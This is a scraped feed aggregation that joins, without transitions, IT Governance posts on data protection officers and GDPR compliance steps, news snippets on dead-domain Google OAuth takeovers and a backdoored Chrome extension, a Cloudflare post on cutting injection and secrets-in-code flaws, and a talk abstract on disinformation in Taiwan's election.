&lt;p&gt;Circumstances can change, as can guidance from the ICO (Information Commissioner’s Office), EDPB (European Data Protection Board), and similar bodies. Organisations should make someone responsible for monitoring such changes.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Data-protection-is-international"&gt;Data protection is international&lt;/h2&gt;



&lt;p&gt;The EU GDPR, UK GDPR and DPA 2018 aren’t the only laws you may need to comply with.&lt;/p&gt;



&lt;p&gt;Data protection laws exist in almost every country and are relevant wherever you do business. You can design your systems and processes such that they meet all these legal requirements. A management system like an &lt;a href="https://www.itgovernance.co.uk/iso27001" rel="noreferrer noopener" target="_blank"&gt;ISO 27001 ISMS&lt;/a&gt; or an &lt;a href="https://www.itgovernance.co.uk/iso-27701" rel="noreferrer noopener" target="_blank"&gt;ISO 27701 PIMS&lt;/a&gt; can significantly help with this.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;But compliance requires clarity.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;If you don’t understand the topics in detail, you risk conflating one standard or regulation with another, causing you to lose out on multiple fronts.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;Conflicting laws&lt;/h3&gt;



&lt;p&gt;You’ll see few conflicts in Europe, as the EU GDPR was designed to integrate with EU laws. And post-Brexit, differences in UK and EU data protection law have remained small (though not non-existent, as discussed earlier).&lt;/p&gt;



&lt;p&gt;But the further afield you go, the more problems you might run into. I experienced this when doing some GDPR work for a large Saudi Arabian organisation – a national law prevented it from being allowed to report data breaches with a risk to data subjects outside the country. And where laws compete, the strictest law always applies.&lt;/p&gt;



&lt;p&gt;DPOs and data privacy leads need to know how to deal with situations like that. They’ll have to find a workaround like publishing a statement on the website along the lines of: ‘Please be aware that you might want to change your password at your earliest opportunity.’&lt;/p&gt;



&lt;p&gt;Being able to clearly distinguish one regulation from another to unpick any problems is a key skill for a DPO.&lt;/p&gt;

&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Guiding-others-towards-compliance"&gt;Guiding others towards compliance&lt;/h2&gt;



&lt;p&gt;Another key way in which the DPO (or privacy lead) can help give the organisation clarity into its data – and compliance – is by asking the right people the right questions.&lt;/p&gt;



&lt;p&gt;The DPO’s role isn’t to ‘do’ compliance themselves, but to &lt;em&gt;monitor&lt;/em&gt; compliance, as well as guide others – especially business line managers – in taking the right actions. So, ask questions around what personal data they’re processing, and why and how they’re processing it. You could also visualise this information in a &lt;a href="https://www.itgovernance.co.uk/gdpr-data-mapping" rel="noreferrer noopener" target="_blank"&gt;data flow map&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Until you get clear answers to these questions, you won’t be able to get clarity on:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Lawful basis&lt;/li&gt;



&lt;li&gt;The risks of processing&lt;/li&gt;



&lt;li&gt;Whether a DPIA is needed&lt;/li&gt;



&lt;li&gt;Necessary technical and organisational measures&lt;/li&gt;



&lt;li&gt;Information needed for your &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;ROPAs (records of processing activities)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The most reliable way to obtain all this information (and more!) – and ensure ongoing compliance – is to appoint a data privacy lead.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Data-breach-management"&gt;Data breach management&lt;/h2&gt;



&lt;p&gt;The value of having someone trained in data protection and privacy isn’t just apparent during business-as-usual times, when the DPO helps in the decision-making process through objective assessment and, where required, using tools like data flow maps and DPIAs.&lt;/p&gt;



&lt;p&gt;The DPO or privacy lead also plays a pivotal role if a &lt;a href="https://www.itgovernance.co.uk/blog/how-long-do-you-have-to-report-a-data-breach" rel="noreferrer noopener" target="_blank"&gt;data breach&lt;/a&gt; occurs. They can assess the risks, offer practical advice – including about what follow-up action is needed to contain and mitigate the breach – and report it to the ICO if required.&lt;/p&gt;



&lt;p&gt;To be effective in both business-as-usual matters and during business disruption, the DPO or privacy lead must secure the support of senior management – not just to have sufficient resources at their disposal, but to be able to introduce changes where needed.&lt;/p&gt;



&lt;p&gt;This includes implementing lessons learned following a data breach.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Knowledge-skills-and-competence"&gt;Knowledge, skills and competence&lt;/h2&gt;



&lt;p&gt;Experience will stand a DPO in good stead, but isn’t a substitute for competence.&lt;/p&gt;



&lt;p&gt;Apart from having a good grasp of the relevant regulations and excellent fact-checking abilities, a DPO will need to follow processes and be able to handle people well. Few people like change, so being able to convince them of the merits of those changes is an essential skill.&lt;/p&gt;



&lt;p&gt;As the DPO or privacy lead, you’ll be the go-to person, the ‘safe pair of hands’, the trusted adviser and the mediator. You’re not just going to be following procedures with care and caution – you’ll have a wide range of stakeholders to deal with.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.itgovernance.co.uk/shop/product/certified-data-protection-officer-c-dpo-training-course" rel="noreferrer noopener" target="_blank"&gt;Effective DPO training&lt;/a&gt; covers the ‘how to’ part of the role as well as the ‘what and when’.&lt;/p&gt;



&lt;p&gt;At IT Governance, we give guidance on what it means to be responsible and accountable in a DPO or data privacy leadership role. That’s what makes the difference between someone who has been handed a task and someone who is up to the job.&lt;/p&gt;



&lt;p&gt;And remember: how a person performs in their role ultimately determines their prospects and the commercial wellbeing of their organisation.&lt;/p&gt;

Relatedly, lots of business-minded webapps use Google's OAuth, i.e. "Sign in with Google." It's a low-friction feedback loop—up until the startup fails, the domain goes up for sale, and somebody forgot to close down all the Google stuff.&lt;/p&gt;
&lt;p&gt;Dylan Ayrey, of Truffle Security Co., &lt;a href="https://trufflesecurity.com/blog/millions-at-risk-due-to-google-s-oauth-flaw"&gt;suggests in a report&lt;/a&gt; that this problem is more serious than anyone, especially Google, is acknowledging. Many startups make the critical mistake of not properly closing their accounts—on both Google and other web-based apps—before letting their domains expire.&lt;/p&gt;
&lt;p&gt;Given the number of people working for tech startups (6 million), the failure rate of said startups (90 percent), their usage of Google Workspaces (50 percent, all by Ayrey's numbers), and the speed at which startups tend to fall apart, there are a lot of Google-auth-connected domains up for sale at any time. That would not be an inherent problem, except that, as Ayrey shows, buying a domain with a still-active Google account can let you re-activate the Google accounts for former employees.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/01/startup-necromancy-dead-google-apps-domains-can-be-compromised-by-new-owners/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

In line with this, we're reducing the prevalence of vulnerability classes across our products.</description><content:encoded>&lt;p&gt;In today’s rapidly evolving digital landscape, securing software systems has never been more critical. Cyber threats continue to exploit systemic vulnerabilities in widely used technologies, leading to widespread damage and disruption. That said, the &lt;a href="https://www.cisa.gov/"&gt;&lt;u&gt;United States Cybersecurity and Infrastructure Agency (CISA)&lt;/u&gt;&lt;/a&gt; helped shape best practices for the technology industry with their &lt;a href="https://www.cisa.gov/securebydesign/pledge"&gt;&lt;u&gt;Secure-by-Design pledge&lt;/u&gt;&lt;/a&gt;. &lt;a href="https://blog.cloudflare.com/secure-by-design-principles/"&gt;&lt;u&gt;Cloudflare signed this pledge&lt;/u&gt;&lt;/a&gt; on May 8, 2024, reinforcing our commitment to creating resilient systems where security is not just a feature, but a foundational principle.&lt;/p&gt;&lt;p&gt;We’re excited to share an update aligned with one of CISA’s goals in the pledge: &lt;i&gt;To reduce entire classes of vulnerabilities&lt;/i&gt;. This goal aligns with the Cloudflare Product Security program’s initiatives to continuously automate proactive detection and vigorously prevent vulnerabilities at scale.   &lt;/p&gt;&lt;p&gt;Cloudflare’s commitment to the CISA pledge reflects our dedication to transparency and accountability to our customers. This blog post outlines why we prioritized certain vulnerability classes, the steps we took to further eliminate vulnerabilities, and the measurable outcomes of our work.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;The core philosophy that continues: prevent, not patch&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-core-philosophy-that-continues-prevent-not-patch"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudflare’s core security philosophy is to prevent security vulnerabilities from entering production environments. One of the goals for Cloudflare’s Product Security team is to champion this philosophy and ensure secure-by-design approaches are part of product and platform development. Over the last six months, the Product Security team aggressively added both new and customized rulesets aimed at completely eliminating secrets and injection code vulnerabilities. These efforts have enhanced detection precision, reducing false positives, while enabling the proactive detection and blocking of these two vulnerability classes. Cloudflare’s security practice to block vulnerabilities before they are introduced into code at merge or code changes serves to maintain a high security posture and aligns with CISA’s pledge around proactive security measures.&lt;/p&gt;&lt;p&gt;Injection vulnerabilities are a critical vulnerability class, irrespective of the product or platform. These occur when code and data are improperly mixed due to lack of clear boundaries as a result of inadequate validation, unsafe functions, and/or improper sanitization. Injection vulnerabilities are considered high impact as they lead to compromise of confidentiality, integrity, and availability of the systems involved. Some of the ways Cloudflare continuously detects and prevents these risks is through security reviews, secure code scanning, and vulnerability testing. Additionally, ongoing efforts to institute improved precision serve to reduce false positives and aggressively detect and block these vulnerabilities at the source if engineers accidentally introduce these into code.&lt;/p&gt;&lt;p&gt;Secrets in code is another vulnerability class of high impact, as it presents significant risk related to confidential information leaks, potentially leading to unauthorized access and insider threat challenges. In 2023, Cloudflare prioritized tuning our security tools and systems to further improve the detection and reduction of secrets within code. Through audits and usage patterns analysis across all Cloudflare repositories, we further decreased the probability of the reintroduction of these vulnerabilities into new code by writing and enabling enhanced secrets detection rules.&lt;/p&gt;&lt;p&gt;Cloudflare is committed to elimination of these vulnerability classes regardless of their criticality. By addressing these vulnerabilities at their source, Cloudflare has significantly reduced the attack surface and the potential for exploitation in production environments. This approach established secure defaults by enabling developers to rely on frameworks and tools that inherently separate data or secrets from code, minimizing the need for reactive fixes. Additionally, resolving these vulnerabilities at the code level “future-proofs” applications, ensuring they remain resilient as the threat landscape evolves. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Cloudflare’s techniques for addressing these vulnerabilities&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cloudflares-techniques-for-addressing-these-vulnerabilities"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;To address both injection and embedded secrets vulnerabilities, Cloudflare focused on building secure defaults, leveraging automation, and empowering developers. To establish secure default configurations, Cloudflare uses frameworks designed to inherently separate data from code. We also increased reliance on secure storage systems and secret management tools, integrating them seamlessly into the development pipeline.&lt;/p&gt;&lt;p&gt;&lt;i&gt;Continuous automation played a critical role in our strategy.&lt;/i&gt; Static analysis tools integration with DevOps process were enhanced with customized rule sets to block issues based on observed patterns and trends. Additionally, along with security scans running on every pull and merge request, software quality assurance measures of “build break”  and “stop the code” were enforced. This prevented risks from entering production when true positive vulnerabilities were detected across all Cloudflare development activities, irrespective of criticality and impacted product. This proactive approach has further reduced the likelihood of these vulnerabilities reaching production environments. &lt;/p&gt;&lt;p&gt;&lt;i&gt;Developer enablement was another key pillar&lt;/i&gt;. Priority was placed on bolstering existing continuous education and training for engineering teams by providing additional guidance and best practices on preventing security vulnerabilities, and leveraging our centralized secrets platform in an automated way. Embedding these principles into daily workflows has fostered a culture of shared responsibility for security across the organization.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;The role of custom rulesets and “build break” &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-role-of-custom-rulesets-and-build-break"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;To operationalize the more aggressive detection and blocking capabilities, Cloudflare’s Product Security team wrote new detection rulesets for its &lt;a href="https://en.wikipedia.org/wiki/Static_application_security_testing"&gt;&lt;u&gt;static application security testing (SAST)&lt;/u&gt;&lt;/a&gt; tool integrated in CI/CD workflows and hardened the security criteria for code releases to production. Using the SAST tooling with both default and custom rulesets allows the security team to perform comprehensive scans for secure code, secrets, and software supply chain vulnerabilities, virtually eliminating injection vulnerabilities and secrets from source code. It also enables the security team to identify and address issues early while systematically enforcing security policies.&lt;/p&gt;&lt;p&gt;Cloudflare’s expansion of the security tool suite played a critical role in the company’s secure product strategy. Initially, rules were enabled in “monitoring only” mode to understand trends and potential false positives. Then rules were fine-tuned to enforce and adjust priorities without disrupting development workflows. Leveraging internal threat models, the team writes custom rules tailored to Cloudflare’s infrastructure. Every &lt;a href="https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-pull-requests"&gt;&lt;u&gt;pull request (PR)&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://github.com/diffblue/gitlab/blob/master/doc/user/project/merge_requests/creating_merge_requests.md"&gt;&lt;u&gt;merge request (MR)&lt;/u&gt;&lt;/a&gt; was scanned against these specific rule sets, including those targeting injection and secrets. The fine-tuned rules, optimized for high precision, are then activated in blocking mode, which leads to breaking the build when detected. This process provides vulnerability remediation at the PR/MR stage.&lt;/p&gt;&lt;p&gt;Hardening these security checks directly into the CI/CD pipeline enforces a proactive security assurance strategy in the development lifecycle. This approach ensures vulnerabilities are detected and addressed early in the development process before reaching production. The detection and blocking of these issues early reduces remediation efforts, minimizes risk, and strengthens the overall security of our products and systems.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Outcomes&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#outcomes"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudflare continues to follow a culture of transparency as it provides increased visibility into the root cause of an issue and consequently allowing us to improve the process/product at scale. As a result, these efforts have yielded tangible results and continue to strengthen the security posture of all Cloudflare products.&lt;/p&gt;&lt;p&gt;In the second half of 2024, the team aggressively added new rulesets that helped detect and remove new secrets introduced into code repositories. This led to a 79% reduction of secrets in code over the previous quarter, underscoring Cloudflare’s commitment to safeguarding the company's codebase and protecting sensitive information. Following a similar approach, the team also introduced new rulesets in blocking mode, irrespective of the criticality level for all injection vulnerabilities. These improvements led to an additional 44% reduction of potential SQL injection and code injection vulnerabilities.&lt;/p&gt;&lt;p&gt;While security tools may produce false positives, customized rulesets with high-confidence true positives remain a key step in order to methodically evaluate and address the findings. These reductions reflect the effectiveness of proactive security measures in reducing entire vulnerability classes at scale. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Future plans&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#future-plans"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudflare will continue to mature the current practices and enforce secure-by-design principles. Some other security practices we will continue to mature include: providing secure frameworks, threat modeling at scale, integration of automated security tooling in every stage of the software development lifecycle (SDLC), and ongoing role based developer training on leading edge security standards. All of these strategies help reduce, or eliminate, entire classes of vulnerabilities.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Conclusion&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#conclusion"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Irrespective of the industry, if your organization builds software, we encourage you to familiarize yourself with &lt;a href="https://www.cisa.gov/securebydesign"&gt;&lt;u&gt;CISA’s ‘Secure by Design’ principles&lt;/u&gt;&lt;/a&gt; and create a plan to implement them in your company. The commitment is built around seven security goals, prioritizing the security of customers.&lt;/p&gt;&lt;p&gt;The CISA Secure by Design pledge challenges organizations to think differently about security. By addressing vulnerabilities at their source, Cloudflare has demonstrated measurable progress in reducing systemic risks.&lt;/p&gt;&lt;p&gt;Cloudflare’s continued focus on addressing vulnerability classes through prevention mechanisms outlined above serves as a critical foundation.

But looking at Taiwan’s 2024 election, none of these nightmare scenarios materialized. The deafening silence of effective AI disinformation from China, America’s most advanced opponent, was surprising. Even more so given the focus on the election at the highest levels of the Chinese government.&lt;/p&gt;
&lt;p&gt;In this highly-engaging talk, Martin Wendiggensen details how he set out to study the election and collected tens of thousands of hours of footage from YouTube and television as well as hundreds of thousands of news articles, blog posts, and social media content. This collection was then analyzed with a multi-modal AI pipeline. The results indicated that the small amount of AI-content received no engagement and had no impact.&lt;/p&gt;
&lt;p&gt;Instead, Taiwanese billionaires earning most of their money in China mounted a concerted effort to buy or set up local news outlets in Taiwan in the run-up to the election. Conducting a large-scale analysis of these outlets’ output uncovered interesting results. Their viewership, numbering in the millions, presented slanted narratives aligned with the Beijing-friendly KMT and a new emergent third party. While losing the presidential election, these two parties managed to wrest control of Taiwan’s parliament and are set to have a major impact on the country’s foreign and domestic policies.&lt;/p&gt;
&lt;p&gt;This presentation guides the audience through Chinese and local disinformation efforts in the Taiwanese election, highlighting the main lessons that can be drawn from them to safeguard future elections. Along the way, Martin explains the research methodology and toolbox that leverages open-source AI to fight disinformation.&lt;/p&gt;

&lt;/ol&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Secure-management-buy-in"&gt;1. Secure management buy-in&lt;/h2&gt;



&lt;p&gt;Board or senior management support is a prerequisite to successfully introducing cultural change to the organisation.&lt;/p&gt;



&lt;p&gt;This doesn’t just ensure the project will be sufficiently resourced, but also ensures improved cooperation. Don’t forget: while someone will be in charge of the overall project – the data protection lead – that person isn’t responsible for ‘doing’ compliance themselves. Rather, they guide others through the necessary activities, and are responsible for maintaining compliance.&lt;/p&gt;



&lt;p&gt;But to get such cooperation, and see as little resistance to change as possible, managers must support these changes.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Identify-what-personal-data-you-hold"&gt;2. Identify what personal data you hold&lt;/h2&gt;



&lt;p&gt;Contrary to common belief, the GDPR &lt;em&gt;isn’t&lt;/em&gt; prescriptive.&lt;/p&gt;



&lt;p&gt;The Regulation doesn’t list specific actions every organisation within scope must take. Rather, it takes a principles- and risk-based approach. Organisations that process less personal data, or less &lt;a href="https://www.itgovernance.co.uk/blog/the-gdpr-do-you-know-the-difference-between-personal-data-and-sensitive-data" rel="noreferrer noopener" target="_blank"&gt;sensitive data&lt;/a&gt;, require less rigorous measures than entities that process lots of highly sensitive data.&lt;/p&gt;



&lt;p&gt;But to determine what’s appropriate for your organisation, you must first identify exactly what personal data you’re collecting and holding.&lt;/p&gt;



&lt;p&gt;To make life easier, take it one department at a time, preferably starting with HR and other highly regulated teams. Data protection leads may also want to look at higher-risk departments before lower-risk teams, as well as take into account which teams are more receptive to becoming compliant.&lt;/p&gt;



&lt;p&gt;You may well find that as you get a few teams on board, and they start to experience the day-to-day benefits of compliance, the remaining teams become more cooperative too.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Identify-your-processing-activities"&gt;3. Identify your processing activities&lt;/h2&gt;



&lt;p&gt;Once you’ve identified what personal data you collect and process, you can identify the processing activities for which you’re using that data.&lt;/p&gt;



&lt;p&gt;You could think of this as creating your ‘data inventory’, which you can later use as the basis for your Article 30 &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;ROPAs (records of processing activities)&lt;/a&gt;. Make sure you specifically identify what data is used for what processing activities. This will highlight data you might be collecting but not using, or that doesn’t need to be used to fulfil the purpose of a given activity (raising &lt;a href="https://www.itgovernance.co.uk/blog/how-organisations-are-failing-to-process-personal-data-lawfully-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;issues around lawfulness&lt;/a&gt;).&lt;/p&gt;



&lt;p&gt;This isn’t just to meet key GDPR principles like data minimisation and purpose limitation, but also minimises the risk to your organisation.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Identify-your-purposes-for-processing"&gt;4. Identify your purposes for processing&lt;/h2&gt;



&lt;p&gt;The GDPR demands that personal data be processed &lt;em&gt;lawfully&lt;/em&gt;.&lt;/p&gt;



&lt;p&gt;That means you must be able to rely on one of six &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;lawful bases&lt;/a&gt; to process the data:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Contractual obligation&lt;/li&gt;



&lt;li&gt;Legal obligation&lt;/li&gt;



&lt;li&gt;Vital interests&lt;/li&gt;



&lt;li&gt;Public interest&lt;/li&gt;



&lt;li&gt;Legitimate interests&lt;/li&gt;



&lt;li&gt;Consent&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;If you can’t point to one of these purposes for a processing activity, that doesn’t simply make the processing unlawful – it strongly suggests the data isn’t serving a &lt;em&gt;business &lt;/em&gt;purpose, either.&lt;/p&gt;



&lt;p&gt;If you can’t explain why you’re collecting the data – and “just in case” isn’t a good reason – you should probably destroy that data.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;h2 class="wp-block-heading" id="Eliminate-inefficiencies"&gt;5. Eliminate inefficiencies&lt;/h2&gt;



&lt;p&gt;Besides uncovering data you don’t need, you may identify other inefficiencies, too:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Duplicated work/processes&lt;/li&gt;



&lt;li&gt;A process that could be done in another way (simpler, cheaper, faster, etc.)&lt;/li&gt;



&lt;li&gt;Data that’s not properly secured&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Addressing such matters makes it easier to manage your risks, and improves data governance and accountability. People will take ownership and responsibility for their roles, and communicate better.&lt;/p&gt;



&lt;p&gt;As an organisation, you’ll also be more confident and create a better culture.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Conduct-a-risk-assessment"&gt;6. Conduct a risk assessment&lt;/h2&gt;



&lt;p&gt;Now that your business processes are more settled, it’s time to look at your risks.&lt;/p&gt;



&lt;p&gt;In spite of the general rewards that come from achieving GDPR compliance, most organisations pursue it – in the first instance – to mitigate their risks. Specifically, those of data breaches and enforcement action.&lt;/p&gt;



&lt;p&gt;We’ve previously interviewed our head of GRC consultancy, Damian Garcia, about &lt;a href="https://www.itgovernance.co.uk/blog/how-to-manage-your-cyber-risks" rel="noreferrer noopener" target="_blank"&gt;where to start with risk management&lt;/a&gt;, &lt;a href="https://www.itgovernance.co.uk/blog/how-do-you-mitigate-information-security-risk" rel="noreferrer noopener" target="_blank"&gt;how to mitigate risks&lt;/a&gt;, and &lt;a href="https://www.itgovernance.co.uk/blog/how-to-select-effective-security-controls" rel="noreferrer noopener" target="_blank"&gt;how to select effective security controls&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Some of his top tips include:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;Make sure you clearly define what constitutes a ‘high’, ‘medium’ or ‘low’ risk. Establish a common vocabulary to make sure everyone is using the same words to mean the same thing.&lt;/li&gt;



&lt;li&gt;Remember that you don’t have to &lt;em&gt;eliminate&lt;/em&gt; a risk – just bring the risk level down to an acceptable level.&lt;/li&gt;



&lt;li&gt;To achieve this, you can choose from four broad risk responses: modify, share, retain and avoid.&lt;/li&gt;



&lt;li&gt;Of these, ‘modify’ – i.e. implementing a control – is the most common response. When choosing your measures, be sure to ask ‘why’. What &lt;em&gt;benefit&lt;/em&gt; does that control have, and does it outweigh its cost?&lt;/li&gt;



&lt;li&gt;Should you choose to ‘share’ a risk, remember that outsourcing a risk doesn’t equate to getting rid of that risk. Damian gave more specific tips on mitigating the risks around outsourcing &lt;a href="https://www.itgovernance.co.uk/blog/how-do-you-mitigate-information-security-risk#Share-the-risk" rel="noreferrer noopener" target="_blank"&gt;here&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;







&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Conduct-a-DPIA-(data-protection-impact-assessment)"&gt;7. Conduct a DPIA&lt;/h2&gt;



&lt;p&gt;Where processing “is likely to result in a high risk to the rights and freedoms of natural persons”, organisations must carry out a DPIA (data protection impact assessment) under Article 35 of the GDPR.&lt;/p&gt;



&lt;p&gt;To identify processing activities that may present that “high risk”, look to your data inventory and/or data flow maps. They’ll likely involve special categories of data (such as medical information), &lt;a href="https://www.itgovernance.co.uk/blog/transferring-personal-data-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;international transfers&lt;/a&gt;, new software, new processing activities, and so on. Our &lt;a href="https://www.itgovernance.co.uk/a-concise-guide-to-data-protection-impact-assessments" rel="noreferrer noopener" target="_blank"&gt;free green paper&lt;/a&gt; elaborates on which processing activities are likely to require a DPIA, and how to conduct one.&lt;/p&gt;



&lt;p&gt;Remember that the risk must be “high” from the &lt;em&gt;data subject’s&lt;/em&gt; perspective – not that of the organisation, as with typical risk assessments.&lt;/p&gt;



&lt;p&gt;That said, by mitigating the risks to the data subject, you’ll likely also be reducing the risks to your organisation.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Implement-appropriate-technical-and-organisational-measures"&gt;8. Implement appropriate technical and organisational measures&lt;/h2&gt;



&lt;p&gt;Another key GDPR principle is ‘integrity and confidentiality.’&lt;/p&gt;



&lt;p&gt;This requires personal data to be processed in a way that ensures “appropriate security” by using “appropriate technical or organisational measures”. In addition, Article 32 of the GDPR requires appropriate technical and organisational measures to ensure “a level of security appropriate to the risk”.&lt;/p&gt;



&lt;p&gt;Such measures can include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Encryption&lt;/li&gt;



&lt;li&gt;Pseudonymisation&lt;/li&gt;



&lt;li&gt;Strong &lt;a href="https://www.itgovernance.co.uk/blog/what-is-access-control" rel="noreferrer noopener" target="_blank"&gt;access control&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/data-protection-staff-awareness" rel="noreferrer noopener" target="_blank"&gt;Staff awareness training&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;Up-to-date, effective &lt;a href="https://www.itgovernance.co.uk/shop/product/gdpr-documentation-toolkit" rel="noreferrer noopener" target="_blank"&gt;policies and procedures&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;Take the next step in your GDPR compliance project&lt;/h2&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="alignright size-large is-resized" id="cc-logo"&gt;&lt;a href="https://www.itgovernance.co.uk/cybercomply" rel=" noreferrer noopener" target="_blank"&gt;&lt;img alt="" src="https://www.itgovernance.co.uk/shop/images/product/medium/5370.png" style="width: 200px;" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;These eight steps should get your GDPR project off to a good start, laying the groundwork for both compliance and more efficient business processes.&lt;/p&gt;



&lt;p&gt;However, compliance isn’t a one-off activity – it’s something to &lt;em&gt;maintain&lt;/em&gt;.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;&lt;a href="https://www.itgovernance.co.uk/cybercomply" rel="noreferrer noopener" target="_blank"&gt;CyberComply&lt;/a&gt;&lt;/strong&gt; can help with this. In just one powerful tool, you can:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Manage your GDPR compliance gaps;&lt;/li&gt;



&lt;li&gt;Map data flows;&lt;/li&gt;



&lt;li&gt;Automate ROPA creation; and&lt;/li&gt;



&lt;li&gt;Increase efficiency and minimise errors when conducting DPIAs.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The compromises came to light with the &lt;a href="https://www.vulnu.com/p/breaking-cyberhaven-chrome-extension-compromised"&gt;discovery&lt;/a&gt; by data loss prevention service Cyberhaven that a Chrome extension used by &lt;a href="https://web.archive.org/web/20241227171802/https://chromewebstore.google.com/detail/cyberhaven-security-exten/pajkjnmeojmbapicmbpliphjmcekeaac"&gt;400,000&lt;/a&gt; of its customers had been updated with code that stole their sensitive data.&lt;/p&gt;
&lt;h2&gt;’Twas the night before Christmas&lt;/h2&gt;
&lt;p&gt;The malicious extension, available as version 24.10.4, was available for 31 hours, from December 25 at 1:32 AM UTC to Dec 26 at 2:50 AM UTC. Chrome browsers actively running Cyberhaven during that window would automatically download and install the malicious code. Cyberhaven responded by issuing version 24.10.5, and 24.10.6 a few days later.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/01/dozens-of-backdoored-chrome-extensions-discovered-on-2-6-million-devices/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/how-a-gdpr-gap-analysis-helps-secure-support-from-senior-management"&gt;How a GDPR Gap Analysis Helps Secure Support From Senior Management&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;GDPR gap analysis data shows compliance in the UK is “quite low”&lt;/h2&gt;



